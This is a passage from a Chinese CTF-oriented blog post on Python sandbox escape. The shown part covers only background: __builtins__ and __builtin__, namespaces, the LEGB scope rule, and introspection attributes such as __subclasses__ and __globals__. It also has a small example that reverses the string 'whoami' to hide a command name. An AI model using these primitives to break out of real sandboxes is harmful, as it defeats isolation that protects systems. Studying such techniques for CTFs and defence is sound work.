<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>python沙箱逃逸 | Valen的博客</title><meta name="keywords" content="python,ctf"><meta name="author" content="Valen"><meta name="copyright" content="Valen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="主要总结和学习一下Python沙箱逃逸。">
<meta property="og:type" content="article">
<meta property="og:title" content="python沙箱逃逸">
<meta property="og:url" content="https://0314valen.github.io/article/2022-03-09-python%E6%B2%99%E7%AE%B1/index.html">
<meta property="og:site_name" content="Valen的博客">
<meta property="og:description" content="主要总结和学习一下Python沙箱逃逸。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img.paulzzh.tech/touhou/random">
<meta property="article:published_time" content="2022-03-08T16:00:00.000Z">
<meta property="article:modified_time" content="2022-09-20T14:17:32.945Z">
<meta property="article:author" content="Valen">
<meta property="article:tag" content="python">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.paulzzh.tech/touhou/random"><link rel="shortcut icon" href="/image/UI_images/favicon.png"><link rel="canonical" href="https://0314valen.github.io/article/2022-03-09-python%E6%B2%99%E7%AE%B1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'python沙箱逃逸',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-09-20 22:17:32'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/image/UI_images/avatar.jpg" onerror="onerror=null;src='/image/UI_images/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/CyberChef/"><i class="fa-fw fas fa-music"></i><span> CyberChef</span></a></li><li><a class="site-page child" href="/Linux-command/"><i class="fa-fw fas fa-video"></i><span> Linux命令大全</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.paulzzh.tech/touhou/random')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Valen的博客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/CyberChef/"><i class="fa-fw fas fa-music"></i><span> CyberChef</span></a></li><li><a class="site-page child" href="/Linux-command/"><i class="fa-fw fas fa-video"></i><span> Linux命令大全</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">python沙箱逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-08T16:00:00.000Z" title="发表于 2022-03-09 00:00:00">2022-03-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-20T14:17:32.945Z" title="更新于 2022-09-20 22:17:32">2022-09-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/python/">python</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/python/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>30分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="python沙箱逃逸"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>主要总结和学习一下Python沙箱逃逸。</p>
<span id="more"></span>

<h1 id="Python沙箱逃逸"><a href="#Python沙箱逃逸" class="headerlink" title="Python沙箱逃逸"></a>Python沙箱逃逸</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__name__ 是属于 python 中的内置类属性，就是它会天生就存在于一个 python 程序中，代表对应程序名称。</span><br><span class="line">自己的__name__在自己用时就是 main，当自己作为模块被调用时就是自己的名字</span><br><span class="line">一段程序作为主线运行程序时其内置名称就是 __main__</span><br><span class="line">print(__name__)				#main</span><br><span class="line"></span><br><span class="line">id()函数返回对象的唯一标识符，标识符是一个整数。CPython 中id()函数用于获取对象的内存地址。</span><br><span class="line">print(id(max))				#2964786132208</span><br><span class="line"></span><br><span class="line">print(&#x27;whoami&#x27;[::-1])#imaohw反转</span><br><span class="line"></span><br><span class="line">getattr() 函数用于返回一个对象属性值。获取对象属性后返回值可直接使用：</span><br><span class="line"></span><br><span class="line">Python中is与==的使用区别</span><br><span class="line">==是比较两个对象的内容是否相等，即两个对象的“值“”是否相等，不管两者在内存中的引用地址是否一样。</span><br><span class="line">is比较的是两个实例对象是不是完全相同，它们是不是同一个对象，占用的内存地址是否相同。is比较两个条件：1.内容相同。2.内存中地址相同</span><br><span class="line"></span><br><span class="line">reload() 用于重新载入之前载入的模块。在Python2.x版本中reload()是内置函数，可以直线使用，参见Python2.xreload()函数。在Python2.x~ Python3.3版本移到imp包中(Python2.x 也可以导入 imp 包使用)，Python3.4 之后到版本移到了importlib包中。</span><br><span class="line"></span><br><span class="line">__class__功能和type()函数一样，都是查看对象所在的类。__class__可以套用</span><br><span class="line">__bases__和__bases__都是内置函数， 用来查看类的继承关系</span><br><span class="line"></span><br><span class="line">__subclasses__()查看类的直接子类集合，获取类的所有子类</span><br><span class="line"></span><br><span class="line">__globals__[&#x27;__file__&#x27;]获取当前的代码所在的文件名</span><br><span class="line"></span><br><span class="line">enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。Python 2.3. 以上版本可用，2.6 添加 start 参数。</span><br><span class="line"></span><br><span class="line">__dict__ 是类的内置属性，用于以字典的形式存储类里的属性，也就是存储那些 self.xxx 的属性</span><br></pre></td></tr></table></figure>

<h3 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h3><ul>
<li>import</li>
</ul>
<p>在python中有时候需要从模块中导入函数，常用语法包括：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. import somemodule</span><br><span class="line">2. from somemodule import somefunction</span><br><span class="line">3. from somemodule import somefunction, anotherfunction, yetanotherfunction</span><br><span class="line">4. from somemodule import *</span><br></pre></td></tr></table></figure>

<p>如果在不同的模块中有同名函数，也可以使用as来给整个模块加一个别名或给模块的方法加一个别名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import math as foobar</span><br><span class="line">&gt;&gt;&gt; foobar.sqrt(4)#2.0</span><br></pre></td></tr></table></figure>

<ul>
<li>整数除法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print (1/3)									#python2输出0，python3输出0.3333333333333333</span><br><span class="line">修改</span><br><span class="line">from __future__ import division</span><br><span class="line">print (1/3)									#python2输出0.333333333333，python3输出0.3333333333333333</span><br></pre></td></tr></table></figure>

<ul>
<li>print语句</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python2的语法支持print(‘hello’)	同时支持print ‘hello’	但是不支持print(&#x27;hello&#x27;, end=&#x27;\n&#x27;)</span><br><span class="line">python3的语法支持print(‘hello’)	但不支持print ‘hello’	可以支持print(&#x27;hello&#x27;, end=&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">print(&#x27;hello&#x27;, end=&#x27;\n&#x27;)					#python3正常输出，python2报错</span><br><span class="line">修改</span><br><span class="line">from __future__ import print_function</span><br><span class="line">print(&#x27;hello&#x27;, end=&#x27;\n&#x27;)					#python3正常输出，python2正常输出</span><br><span class="line"></span><br><span class="line">Python 2.7可以通过 __future__ 将2.7版本中的print语句移除，让你可以使用Python3.X的print()函数的形式打印输出</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>函数区别</th>
<th>python3</th>
<th>python2</th>
</tr>
</thead>
<tbody><tr>
<td>input()</td>
<td>接收任意数据类型</td>
<td>只支持正确的数值类型</td>
</tr>
<tr>
<td>raw_input()</td>
<td>没有此函数</td>
<td>数值和字符串,不能直接识别字符串</td>
</tr>
<tr>
<td>除法</td>
<td>不考虑除数或被除数里有一个是浮点型</td>
<td>必须是除数或被除数里面有一个是浮点型，在整除时才会出现小数；否则就成了整除</td>
</tr>
</tbody></table>
<h3 id="future语句"><a href="#future语句" class="headerlink" title="future语句"></a>future语句</h3><p><code>__future__</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">官方描述：https://docs.python.org/2.7/library/__future__.html官方描述</span><br><span class="line">__future__是一个模块而非单独的函数，引用主要有 3 个原因：</span><br><span class="line">1.避免混淆已有的分析 import 语句并查找 import 的模块的工具。</span><br><span class="line">2.确保 future 语句 在 2.1 之前的版本运行时至少能抛出 runtime 异常（import __future__ 会失败，因为 2.1 版本之前没有这个模块）。</span><br><span class="line">3.当引入不兼容的修改时，可以记录其引入的时间以及强制使用的时间。这是一种可执行的文档，并且可以通过 import __future__ 来做程序性的检查。</span><br><span class="line"></span><br><span class="line">概括：某个版本中出现了某个新的功能特性，而且这个特性和当前版本中使用的不兼容，也就是它在该版本中不是语言标准，那么我如果想要使用的话就需要从__future__模块导入。在2.1版本之前并没有__future__，所以使用它会引发异常。当然，在以后的某个版本中，比如说3中，某个特性已经成为标准的一部分，那么使用该特性就不用从__future__导入了。</span><br><span class="line"></span><br><span class="line">目的：关于版本的问题，__future__目的是把下一个版本的特性导入到当前版本，这样我们就可以在当前版本中测试一些新版本的特性，从而使得python未来版本的迁移更加容易。是为了在老版本的Python代码中兼顾新特性的一种方法。从python2.1开始，当一个新的语言特性首次出现在发行版中时，如果该新特性与旧版本的python不兼容，则该新特性默认会被禁用。</span><br><span class="line"></span><br><span class="line">作用：future语句是一种针对编辑器的指令，指明某个特定模块应当使用在某个python发行版中成为标准特性的语法或语义。</span><br></pre></td></tr></table></figure>

<h3 id="模块细节"><a href="#模块细节" class="headerlink" title="模块细节"></a>模块细节</h3><p><code>__builtin__和__builtins__</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要是以Python 2.7为例，因为在Python 3+中，__builtin__模块被命名为builtins</span><br></pre></td></tr></table></figure>

<ul>
<li>命名空间</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">所谓命名空间，其实指的是变量名称（标识符）到对象的映射。在一个正常的Python程序的执行过程中，至少存在两个命名空间：</span><br><span class="line">*全局命名空间*：一般由在程序的全局变量和它们对应的映射对象组成，存放的是当前py文件中（除去函数、类内部的）变量与值的对应关系以及函数名与函数的内存地址的对应关系。</span><br><span class="line">*内建命名空间*：在函数内部由函数局部变量和它们对应的映射对象组成，存放的是一些内置函数，比如input，print，list，len等。</span><br><span class="line">如果定义了函数，则还会有局部命名空间，存放的是函数内部的变量与值的对应关系。</span><br><span class="line">当一个函数被调用时，开辟局部命名空间，当函数执行结束后，局部命名空间消失。</span><br><span class="line">如果一个函数被调用多次，则每调用一次，都要重新开辟局部命名空间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">作用域可以分为两个作用域分别是全局作用域和局部作用域。</span><br><span class="line">全局作用域：全局命名空间+内置命名空间</span><br><span class="line">局部作用域：局部命名空间</span><br><span class="line">局部作用域可以引用全局作用域的变量。但不能修改全局作用域的变量。</span><br></pre></td></tr></table></figure>

<ul>
<li>内建函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在启动Python解释器之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，比如max，dir等函数:</span><br><span class="line">把这些函数称为内建函数，因为不需要作任何定义，在启动Python解释器的时候，就已经导入到内存当中供我们使用</span><br><span class="line">print(max) 				#&lt;built-in function max&gt;</span><br><span class="line">print(dir)				#&lt;built-in function dir&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>dir函数(dir([object]))</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不带参数时，返回当前范围内的变量、方法和定义的类型列表</span><br><span class="line">带参数时，返回参数的属性、方法列表。</span><br><span class="line">如果参数包含方法__dir__()，该方法将被调用。如果参数不包含__dir__()，该方法将最大限度地收集参数信息。</span><br><span class="line">参数说明：object -- 对象、变量、类型</span><br><span class="line">dir()   				#获得当前模块的属性列表</span><br><span class="line">dir([ ])    			#查看列表的方法</span><br></pre></td></tr></table></figure>

<ul>
<li>内建命名空间与<code>__builtins__</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">其实准确地来说，是Python解释器在启动的时候会首先加载内建命名空间，内建命名空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身（注意区分函数名称和函数对象的区别）。</span><br><span class="line"></span><br><span class="line">这些命名空间由__builtins__模块中的名字构成：</span><br><span class="line">print(dir()) #Python 2.7运行得到[&#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;]</span><br><span class="line">可以看到有一个__builtins__的模块名称，这个模块本身定义了一个命名空间，即内建命名空间：</span><br><span class="line"></span><br><span class="line">dir这个内建命名空间</span><br><span class="line">print(dir(__builtins__))		#得到内建函数的名称，如list、dict等，当然还有一些异常和其它属性。</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__builtins__与__builtin__</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">既然内建命名空间由__builtins__模块中的命名空间定义，那么是不是也意味着内建命名空间中所对应的这些函数也是在__builtins__模块中实现的呢？</span><br><span class="line">print(__builtins__)				#得到&lt;module &#x27;__builtin__&#x27; (built-in)&gt;</span><br><span class="line">从结果中可以看到，__builtins__其实还是引用了__builtin__模块而已，这说明真正的模块是__builtin__</span><br><span class="line"></span><br><span class="line">也就是说，前面提到的内建函数其实是在内建模块__builtin__中定义的，即__builtins__模块包含内建命名空间中内建名字的集合（因为它引用或者说指向了__builtin__模块），而真正的内建函数、异常和属性来自__builtin__模块。</span><br><span class="line">也就是说，在Python中，其实真正是只有__builtin__这个模块，并不存在__builtins__这个模块：</span><br><span class="line"></span><br><span class="line">import __builtin__</span><br><span class="line">import __builtins__</span><br><span class="line">&gt;&gt;&gt; ImportError: No module named __builtins__</span><br><span class="line">可以看到，导入__builtin__模块并没有问题，但导入__builtins__模块时就会提示不存在</span><br><span class="line"></span><br><span class="line">在Python中并没有__builtins__这个模块，只有__builtin__模块，__builtins__模块只是在启动Python解释器时，解释器为我们自动创建的一个到__builtin__模块的引用</span><br></pre></td></tr></table></figure>

<ul>
<li>更深层次的区别</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(1)在主模块__main__中</span><br><span class="line"></span><br><span class="line">import __builtin__</span><br><span class="line">print(__builtin__,id(__builtin__))		#(&lt;module &#x27;__builtin__&#x27; (built-in)&gt;, 51100264L)</span><br><span class="line">print(__builtins__,id(__builtin__))		#(&lt;module &#x27;__builtin__&#x27; (built-in)&gt;, 51100264L)</span><br><span class="line">__builtins__与__builtin__是完全一样的，它们指向的都是__builtin__这个内建模块</span><br><span class="line"></span><br><span class="line">可以看到，这时候__builtins__和__builtin__是完全一样的，它们都指向了同一个模块对象，其实这也是Python中引用传递的概念。</span><br><span class="line">其实这种情况跟我们创建一个变量并对它做一次引用传递时的情况是一样的，可以做如下测试：</span><br><span class="line">def func():</span><br><span class="line">    print (&#x27;test&#x27;)</span><br><span class="line">funcs=func</span><br><span class="line">print(func,func.__name__,id(funcs))		#&lt;function func at 0x000002962FFCD550&gt; func 2844073448784</span><br><span class="line">print(funcs,funcs.__name__,id(funcs))	#&lt;function func at 0x000002962FFCD550&gt; func 2844073448784</span><br><span class="line">print(funcs == func,funcs is func)		#True True</span><br><span class="line"></span><br><span class="line">(2)不在主模块__main__中</span><br><span class="line">如果不是在主模块中使用__builtins__，这时候，__builtins__只是对__builtin__.__dict__的一个简单引用而已，可以通过下面的测试来验证说明。</span><br><span class="line">先创建一个test.py，后面我们需要在Python交互器中导入它，那么这时候对于test模块来说，它就不是主模块了。如下：</span><br><span class="line">import __builtin__</span><br><span class="line"></span><br><span class="line">print(&#x27;Module name:&#x27;, __name__)											#(&#x27;Module name:&#x27;, &#x27;test&#x27;)</span><br><span class="line">print( __builtin__ == __builtins__,__builtin__ is __builtins__)			#(False, False)</span><br><span class="line">print(id(__builtin__),id(__builtins__))									#(50772584L, 50815320L)</span><br><span class="line">print(__builtin__.__dict__ == __builtins__,__builtin__.__dict__ is __builtins__)	#(True, True)</span><br><span class="line">print(id(__builtin__.__dict__),id(__builtins__))						#(50815320L, 50815320L)</span><br><span class="line"></span><br><span class="line">然后直接import test,就能看到输出</span><br><span class="line">可以看到输出的结果跟我们想的是完全一样的，即这时候__builtins__其实是对__builtin__.__dict__模块的引用。</span><br></pre></td></tr></table></figure>

<ul>
<li>总结</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果是在主模块__main__中，__builtins__直接引用__builtin__模块，此时模块名__builtins__与模块名__builtin__指向的都是同一个模块，即&lt;builtin&gt;内建模块（这里要注意变量名和对象本身的区别）</span><br><span class="line">如果不是在主模块中，那么__builtins__只是引用了__builtin__.__dict__</span><br><span class="line"></span><br><span class="line">默认情况下，在__main__模块中时，__builtins__是内置模块__builtin__（注意：没有&#x27;s&#x27;）；在任何其他模块中时，是模块本身字典的 __builtins__别名</span><br></pre></td></tr></table></figure>

<h3 id="python的LEGB"><a href="#python的LEGB" class="headerlink" title="python的LEGB"></a>python的LEGB</h3><p>Python的命名空间是一个字典，字典内保存了变量名称与对象之间的映射关系，因此，查找变量名就是在命名空间字典中查找键-值对。</p>
<p>我们已经知道了多个命名空间可以独立存在，而且可以在不同的层次上包含相同的变量名。作用域定义了Python在哪一个层次上查找某个变量名对应的对象。</p>
<p>接下来的问题就是：Python在查找‘名称-对象’映射时，是按照什么顺序对命名空间的不同层次进行查找的？</p>
<p>答案就是：使用的是LEGB规则，表示的是Local -&gt; Enclosed -&gt; Global -&gt; Built-in，其中的箭头方向表示的是搜索顺序。</p>
<p>LEGB含义解释：</p>
<p>L-Local(function)                           函数内的名字空间,可能是在一个函数或者类方法内部。</p>
<p>E-Enclosing (function locals)        外部嵌套函数的名字空间,可能是嵌套函数内，比如说 一个函数包裹在另一个函数内部。</p>
<p>G-Global(module)                         函数定义所在模块（文件）的名字空间,查找全局作用域</p>
<p>B-Builtin(Python)                          Python内置模块的名字空间,内置作用域</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">x = 1</span><br><span class="line">def foo():</span><br><span class="line">    x = 2</span><br><span class="line">    def innerfoo():</span><br><span class="line">        #x = 3</span><br><span class="line">        print(&#x27;locals &#x27;, x)</span><br><span class="line">    innerfoo()</span><br><span class="line">    